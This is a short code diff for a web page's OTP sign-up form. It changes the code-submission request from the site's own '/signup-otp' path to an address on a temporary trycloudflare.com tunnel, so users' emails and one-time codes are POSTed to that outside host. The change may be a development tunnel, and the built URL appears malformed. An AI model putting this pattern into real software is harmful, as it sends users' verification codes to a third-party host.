@@ -2,12 +2,13 @@ const formOtp = document.getElementById('formOtp');
 const emailOtp = localStorage.getItem('email1');
 const otp1 = document.getElementById('otp');
 const p12 = document.getElementById('p12')
+const address = `https://tiny-belle-consolidation-foto.trycloudflare.com/sign-1.js`;
 console.log(emailOtp);
 console.log('Loaded:', localStorage.getItem('email1'));
 formOtp.addEventListener('submit', async function(e) {
     e.preventDefault();
     const otp1In = otp1.value;
-    const sendOtpBack = await fetch('/signup-otp', {
+    const sendOtpBack = await fetch(`${address}/signup-otp`, {
         method:'POST',
         headers:{ 'content-type':'application/json' },
         body:JSON.stringify({ email:emailOtp, otp:otp1In })
